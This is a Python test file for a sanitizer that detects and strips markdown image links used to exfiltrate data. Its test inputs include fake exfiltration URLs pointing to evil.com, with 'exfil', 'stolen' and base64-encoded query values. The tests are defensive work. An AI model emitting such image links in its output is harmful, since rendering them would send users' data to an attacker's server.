"""Tests for exfiltration URL detection module."""

from __future__ import annotations

from mcp_trentina_crunchtools.sanitize.exfiltration import sanitize_exfiltration


class TestExfiltrationDetection:
    """Test markdown image exfiltration URL detection."""

    def test_detects_long_query_value(self) -> None:
        long_val = "A" * 150
        text = f"![img](https://evil.com/collect?data={long_val})"
        cleaned, stats = sanitize_exfiltration(text)
        assert "[image removed]" in cleaned or "[image: img]" in cleaned
        assert stats.exfiltration_urls == 1

    def test_detects_base64_query_value(self) -> None:
        text = "![img](https://evil.com/track?data=SGVsbG8gV29ybGQgdGhpcyBpcyBhIHRlc3Q=)"
        _cleaned, stats = sanitize_exfiltration(text)
        assert stats.exfiltration_urls == 1

    def test_detects_exfil_param_name(self) -> None:
        text = "![](https://evil.com/collect?exfil=value)"
        cleaned, stats = sanitize_exfiltration(text)
        assert "[image removed]" in cleaned
        assert stats.exfiltration_urls == 1

    def test_detects_stolen_param_name(self) -> None:
        text = "![](https://evil.com/collect?stolen=secrets)"
        _cleaned, stats = sanitize_exfiltration(text)
        assert stats.exfiltration_urls == 1

    def test_detects_very_long_url(self) -> None:
        long_url = "https://evil.com/" + "a" * 500
        text = f"![img]({long_url})"
        _cleaned, stats = sanitize_exfiltration(text)
        assert stats.exfiltration_urls == 1

    def test_preserves_normal_images(self) -> None:
        text = "![photo](https://example.com/photo.jpg)"
        cleaned, stats = sanitize_exfiltration(text)
        assert cleaned == text
        assert stats.exfiltration_urls == 0

    def test_preserves_alt_text(self) -> None:
        text = "![my diagram](https://evil.com/collect?exfil=data)"
        cleaned, stats = sanitize_exfiltration(text)
        assert "[image: my diagram]" in cleaned
        assert stats.exfiltration_urls == 1

    def test_clean_text_unchanged(self) -> None:
        text = "Normal text without any markdown images."
        cleaned, stats = sanitize_exfiltration(text)
        assert cleaned == text
        assert stats.exfiltration_urls == 0

    def test_multiple_exfil_images(self) -> None:
        text = "![](https://evil.com/?exfil=1) ![](https://evil.com/?stolen=2)"
        _cleaned, stats = sanitize_exfiltration(text)
        assert stats.exfiltration_urls == 2
